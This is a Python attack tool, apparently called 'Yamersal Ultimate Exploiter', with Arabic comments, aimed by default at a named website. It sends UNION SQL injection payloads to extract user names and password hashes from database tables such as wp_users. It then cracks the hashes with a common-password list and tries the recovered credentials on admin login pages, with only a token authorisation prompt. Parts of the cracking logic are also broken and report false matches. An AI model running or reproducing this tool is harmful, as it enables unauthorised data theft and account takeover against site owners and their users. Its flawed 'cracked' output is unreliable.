#!/usr/bin/env python3
"""
Yamersal Ultimate Exploiter v7.0
Advanced Vulnerability Exploitation & Hash Cracking
Author: Security Researcher
Version: 7.0 - Complete Hash Cracking System
"""

import requests
import json
import urllib.parse
import re
import time
import sys
import os
import hashlib
import base64
import threading
from concurrent.futures import ThreadPoolExecutor

class AdvancedHashCracker:
    def __init__(self):
        self.hash_types = {
            'md5': {'pattern': r'^[a-fA-F0-9]{32}$', 'function': hashlib.md5},
            'sha1': {'pattern': r'^[a-fA-F0-9]{40}$', 'function': hashlib.sha1},
            'sha256': {'pattern': r'^[a-fA-F0-9]{64}$', 'function': hashlib.sha256},
            'sha512': {'pattern': r'^[a-fA-F0-9]{128}$', 'function': hashlib.sha512},
            'mysql': {'pattern': r'^[a-fA-F0-9]{16}$', 'function': None},
            'mysql5': {'pattern': r'^\*[a-fA-F0-9]{40}$', 'function': None},
        }
        
        self.common_passwords = [
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'admin', 'welcome', 'monkey', 'password1',
            '1234567890', 'abcd1234', 'sunshine', 'princess', 'qwertyuiop',
            'letmein', '123abc', 'admin123', 'welcome123', 'password123',
            'test', 'guest', 'root', 'pass', 'pass123', 'admin@123',
            '123456a', '123', '1', 'password@123', 'yamersal', 'admin123',
            '000000', '123456789a', '123qwe', '1q2w3e4r', 'qazwsx',
            'password1', 'password12', 'password1234', 'iloveyou',
            'master', '666666', 'abc123', 'football', 'jordan',
            'harley', 'ranger', 'jennifer', 'hunter', '2000',
            'superman', 'batman', 'trustno1', 'killer', 'welcome1'
        ]

    def identify_hash(self, hash_string):
        """تحديد نوع الهاش"""
        hash_string = hash_string.strip()
        
        for hash_type, info in self.hash_types.items():
            if re.match(info['pattern'], hash_string):
                return hash_type
        
        # تحقق من الهاشات المخصصة (مثل اللي في نتائجك)
        if len(hash_string) >= 40 and all(c in '0123456789abcdef' for c in hash_string.lower()):
            return 'custom_hex'
        
        return 'unknown'

    def crack_hash(self, hash_string):
        """فك تشفير الهاش"""
        hash_type = self.identify_hash(hash_string)
        
        print(f"   🔍 تحليل الهاش: {hash_string}")
        print(f"   📝 النوع المكتشف: {hash_type}")
        
        # جرب كلمات المرور الشائعة
        for password in self.common_passwords:
            if self.verify_password(password, hash_string, hash_type):
                return password, hash_type
        
        # جرب فك التشفير بال XOR
        xor_result = self.try_xor_decryption(hash_string)
        if xor_result:
            return xor_result, f"{hash_type}_xor"
        
        # جرب فك hex
        hex_result = self.try_hex_decoding(hash_string)
        if hex_result and len(hex_result) > 3:
            return hex_result, f"{hash_type}_hex"
        
        return None, hash_type

    def verify_password(self, password, hash_string, hash_type):
        """التحقق من تطابق كلمة المرور مع الهاش"""
        if hash_type in self.hash_types and self.hash_types[hash_type]['function']:
            hash_obj = self.hash_types[hash_type]['function']()
            hash_obj.update(password.encode('utf-8'))
            return hash_obj.hexdigest() == hash_string.lower()
        
        # للهاشات المخصصة، جرب مقارنة بسيطة
        if hash_type == 'custom_hex':
            # جرب إذا كان الهاش هو كلمة المرور نفسها مشفرة بـ hex
            if password.encode().hex() == hash_string.lower():
                return True
            
            # جرب إذا كان الهاش هو كلمة المرور مع بعض التعديلات
            if self.simple_pattern_match(password, hash_string):
                return True
        
        return False

    def simple_pattern_match(self, password, hash_string):
        """مطابقة الأنماط البسيطة للهاشات المخصصة"""
        # إذا كان طول الهاش يساوي ضعف طول كلمة المرور (hex)
        if len(hash_string) == len(password) * 2:
            return True
        
        # إذا كانت كلمة المرور موجودة داخل الهاش
        if password in hash_string.lower():
            return True
        
        return False

    def try_xor_decryption(self, hex_string, keys=None):
        """محاولة فك التشفير بـ XOR"""
        if keys is None:
            keys = [0x20, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x50, 0x55, 0xAA, 0xFF]
        
        try:
            if len(hex_string) % 2 != 0:
                hex_string = '0' + hex_string
            
            bytes_data = bytes.fromhex(hex_string)
            
            for key in keys:
                decrypted = bytes(b ^ key for b in bytes_data)
                
                try:
                    text = decrypted.decode('utf-8', errors='ignore')
                    if text.isprintable() and 3 <= len(text) <= 20:
                        return text
                except:
                    continue
                    
        except:
            pass
        
        return None

    def try_hex_decoding(self, hex_string):
        """محاولة فك ترميز hex"""
        try:
            clean_hex = ''.join(c for c in hex_string if c in '0123456789abcdefABCDEF')
            
            if len(clean_hex) % 2 != 0:
                clean_hex = clean_hex[:-1]
                
            if len(clean_hex) >= 4:
                decoded = bytes.fromhex(clean_hex)
                
                try:
                    text = decoded.decode('utf-8', errors='ignore')
                    if any(c.isalnum() for c in text):
                        return text
                except:
                    return decoded.hex()
                    
        except:
            pass
        
        return None

class UltimateExploiter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.hash_cracker = AdvancedHashCracker()
        self.exploitation_results = []
        self.cracked_hashes = []
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def print_status(self, message, level="INFO"):
        """طباعة رسائل الحالة الملونة"""
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m", 
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]",
            "SUCCESS": "[+]", 
            "WARNING": "[!]",
            "ERROR": "[-]",
            "CRITICAL": "[!]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def extract_hashes_from_sql(self):
        """استخراج الهاشات من ثغرات SQL Injection"""
        self.print_status("🔓 استخراج الهاشات من SQL Injection...", "CRITICAL")
        
        parameters = ['id', 'file', 'path', 'view', 'page']
        sql_payloads = [
            "' UNION SELECT user_login,user_pass,user_email,NULL FROM wp_users--",
            "' UNION SELECT username,password,email,NULL FROM users--",
            "' UNION SELECT user,pass,email,NULL FROM admin_users--",
            "' UNION SELECT name,password,email,NULL FROM members--",
        ]
        
        found_hashes = []
        
        for param in parameters:
            self.print_status(f"📡 اختبار المعامل: {param}", "INFO")
            
            for payload in sql_payloads:
                try:
                    test_url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=15)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # البحث عن الهاشات في الاستجابة
                        hashes = re.findall(r'([a-fA-F0-9]{32,128})', content)
                        
                        for hash_value in hashes:
                            if len(hash_value) >= 32:  # هاشات ذات طول معقول
                                # البحث عن اسم المستخدم المرتبط
                                username = self.extract_username_near_hash(content, hash_value)
                                
                                hash_data = {
                                    'hash': hash_value,
                                    'username': username or 'unknown',
                                    'source_url': test_url,
                                    'parameter': param,
                                    'type': 'sql_injection'
                                }
                                
                                found_hashes.append(hash_data)
                                self.print_status(f"   ✅ تم العثور على هاش: {hash_value}", "SUCCESS")
                                if username:
                                    self.print_status(f"      👤 المستخدم: {username}", "INFO")
                                
                except Exception as e:
                    continue
        
        return found_hashes

    def extract_username_near_hash(self, content, hash_value):
        """استخراج اسم المستخدم بالقرب من الهاش"""
        # البحث عن نص قبل أو بعد الهاش قد يكون اسم مستخدم
        patterns = [
            rf'>([^<]+)</[^>]*>\s*{hash_value}',
            rf'{hash_value}\s*</[^>]*>\s*([^<]+)<',
            rf'([a-zA-Z0-9_@\.-]{{3,50}})[^<]*{hash_value}',
            rf'{hash_value}[^<]*([a-zA-Z0-9_@\.-]{{3,50}})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, content)
            if match:
                username = match.group(1).strip()
                if len(username) > 2 and not username.isdigit():
                    return username
        
        return None

    def crack_discovered_hashes(self, hashes):
        """فك تشفير الهاشات المكتشفة"""
        self.print_status("\n🔓 بدء فك تشفير الهاشات...", "CRITICAL")
        self.print_status(f"📊 عدد الهاشات المكتشفة: {len(hashes)}", "INFO")
        
        cracked_hashes = []
        
        for hash_data in hashes:
            self.print_status(f"\n🔍 معالجة الهاش: {hash_data['hash']}", "INFO")
            self.print_status(f"   👤 المستخدم: {hash_data['username']}", "INFO")
            
            password, hash_type = self.hash_cracker.crack_hash(hash_data['hash'])
            
            if password:
                hash_data['password'] = password
                hash_data['crack_method'] = hash_type
                hash_data['cracked'] = True
                cracked_hashes.append(hash_data)
                
                self.print_status(f"   ✅ تم فك التشفير: {password}", "CRITICAL")
                self.print_status(f"   🛠️  الطريقة: {hash_type}", "INFO")
            else:
                hash_data['cracked'] = False
                self.print_status(f"   ❌ تعذر فك التشفير", "WARNING")
        
        return cracked_hashes

    def exploit_and_crack_hashes(self):
        """استغلال الثغرات وفك الهاشات في عملية واحدة"""
        self.print_status("🚀 بدء الاستغلال الشامل وفك الهاشات...", "CRITICAL")
        
        # 1. استخراج الهاشات من SQL Injection
        discovered_hashes = self.extract_hashes_from_sql()
        
        if not discovered_hashes:
            self.print_status("❌ لم يتم العثور على هاشات", "ERROR")
            return [], []
        
        # 2. فك تشفير الهاشات
        cracked_hashes = self.crack_discovered_hashes(discovered_hashes)
        
        # 3. عرض النتائج
        self.display_hash_results(discovered_hashes, cracked_hashes)
        
        return discovered_hashes, cracked_hashes

    def display_hash_results(self, all_hashes, cracked_hashes):
        """عرض نتائج فك التشفير"""
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("📊 تقرير فك تشفير الهاشات", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        self.print_status(f"\n🔍 إجمالي الهاشات المكتشفة: {len(all_hashes)}", "INFO")
        self.print_status(f"🔓 الهاشات المفكوكة: {len(cracked_hashes)}", "CRITICAL")
        self.print_status(f"📈 نسبة النجاح: {len(cracked_hashes)/len(all_hashes)*100:.1f}%", "INFO")
        
        if cracked_hashes:
            self.print_status("\n🎉 الهاشات المفكوكة بنجاح:", "CRITICAL")
            for i, hash_data in enumerate(cracked_hashes, 1):
                self.print_status(f"\n[{i}] ✅ نجاح كامل!", "SUCCESS")
                self.print_status(f"    👤 المستخدم: {hash_data['username']}", "INFO")
                self.print_status(f"    🔑 الهاش: {hash_data['hash']}", "INFO")
                self.print_status(f"    🗝️  كلمة المرور: {hash_data['password']}", "CRITICAL")
                self.print_status(f"    🛠️  طريقة الفك: {hash_data['crack_method']}", "INFO")
                self.print_status(f"    🌐 المصدر: {hash_data['source_url']}", "INFO")
        
        # حفظ النتائج في ملف
        self.save_hash_results(all_hashes, cracked_hashes)

    def save_hash_results(self, all_hashes, cracked_hashes):
        """حفظ نتائج الهاشات في ملف"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"hash_cracking_report_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("تقرير فك تشفير الهاشات\n")
                f.write("=" * 50 + "\n\n")
                
                f.write(f"الهدف: {self.target}\n")
                f.write(f"وقت المسح: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"إجمالي الهاشات: {len(all_hashes)}\n")
                f.write(f"الهاشات المفكوكة: {len(cracked_hashes)}\n\n")
                
                if cracked_hashes:
                    f.write("الهاشات المفكوكة:\n")
                    f.write("-" * 40 + "\n")
                    for hash_data in cracked_hashes:
                        f.write(f"المستخدم: {hash_data['username']}\n")
                        f.write(f"كلمة المرور: {hash_data['password']}\n")
                        f.write(f"الهاش: {hash_data['hash']}\n")
                        f.write(f"طريقة الفك: {hash_data['crack_method']}\n")
                        f.write(f"المصدر: {hash_data['source_url']}\n")
                        f.write("-" * 40 + "\n")
                
                f.write("\nجميع الهاشات المكتشفة:\n")
                f.write("-" * 40 + "\n")
                for hash_data in all_hashes:
                    f.write(f"المستخدم: {hash_data['username']}\n")
                    f.write(f"الهاش: {hash_data['hash']}\n")
                    f.write(f"المصدر: {hash_data['source_url']}\n")
                    f.write("-" * 40 + "\n")
            
            self.print_status(f"\n💾 تم حفظ التقرير في: {filename}", "SUCCESS")
            
        except Exception as e:
            self.print_status(f"❌ فشل في حفظ التقرير: {e}", "ERROR")

    def test_credentials_login(self, credentials):
        """اختبار بيانات الدخول على لوحات الإدارة"""
        self.print_status("\n🔐 اختبار بيانات الدخول على لوحات الإدارة...", "CRITICAL")
        
        admin_pages = [
            '/admin', '/login', '/wp-admin', '/dashboard',
            '/administrator', '/cp', '/controlpanel'
        ]
        
        successful_logins = []
        
        for page in admin_pages:
            url = f"{self.target}{page}"
            
            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    
                    for cred in credentials:
                        if cred.get('password'):
                            # محاولة تسجيل الدخول
                            login_data = {
                                'username': cred['username'],
                                'password': cred['password'],
                                'email': cred['username']
                            }
                            
                            login_response = self.session.post(url, data=login_data, timeout=10)
                            
                            # التحقق من نجاح التسجيل
                            if any(success_indicator in login_response.text.lower() for success_indicator in 
                                  ['dashboard', 'welcome', 'logout', 'admin']):
                                
                                successful_logins.append({
                                    'url': url,
                                    'username': cred['username'],
                                    'password': cred['password'],
                                    'page': page
                                })
                                
                                self.print_status(f"   ✅ دخول ناجح: {cred['username']} / {cred['password']} على {page}", "CRITICAL")
                                
            except Exception as e:
                continue
        
        return successful_logins

    def run_complete_attack(self):
        """تشغيل الهجوم الشامل"""
        self.print_status("🚀 بدء الهجوم الشامل...", "CRITICAL")
        
        # 1. استخراج وفك الهاشات
        all_hashes, cracked_hashes = self.exploit_and_crack_hashes()
        
        if not cracked_hashes:
            self.print_status("❌ لم يتم فك أي هاش، إنتهى الهجوم", "ERROR")
            return
        
        # 2. اختبار بيانات الدخول
        successful_logins = self.test_credentials_login(cracked_hashes)
        
        # 3. العرض النهائي
        self.print_status("\n" + "="*80, "INFO")
        self.print_status("🎊 الهجوم الشامل مكتمل!", "CRITICAL")
        self.print_status("="*80, "INFO")
        
        self.print_status(f"✅ الهاشات المفكوكة: {len(cracked_hashes)}", "SUCCESS")
        self.print_status(f"🔓 عمليات الدخول الناجحة: {len(successful_logins)}", "CRITICAL")
        
        if successful_logins:
            self.print_status("\n🎯 الدخول الناجح إلى:", "CRITICAL")
            for login in successful_logins:
                self.print_status(f"   🌐 {login['page']}", "INFO")
                self.print_status(f"   👤 {login['username']} : 🗝️ {login['password']}", "CRITICAL")
        else:
            self.print_status("\n⚠️ تم فك الهاشات ولكن لم يتم الدخول إلى لوحات الإدارة", "WARNING")
            self.print_status("💡 جرب استخدام بيانات الدخول يدوياً:", "INFO")
            for cred in cracked_hashes:
                self.print_status(f"   {cred['username']} : {cred['password']}", "INFO")

def main():
    """الدالة الرئيسية"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                   YAMERSAL ULTIMATE EXPLOITER v7.0                         ║
║               Advanced Hash Cracking & Auto Login Testing                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("أدخل عنوان URL (افتراضي: https://yamersal.com): ").strip()
        if not target:
            target = "https://yamersal.com"
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\n⚠️  تحذير قانوني: هذا الأداة للاختبار القانوني فقط!")
    print(f"⚠️  الاستخدام غير المصرح به قد يكون غير قانوني في بلدك!")
    
    confirm = input("هل لديك تصريح لاختبار هذا الهدف؟ (y/n): ").lower()
    if confirm != 'y':
        print("تم إلغاء العملية. الخروج...")
        sys.exit(0)
    
    try:
        exploiter = UltimateExploiter(target)
        exploiter.run_complete_attack()
        
    except KeyboardInterrupt:
        print("\nتم إيقاف الهجوم بواسطة المستخدم. الخروج...")
    except Exception as e:
        print(f"\nفشل الهجوم بسبب الخطأ: {e}")

if __name__ == "__main__":
    main()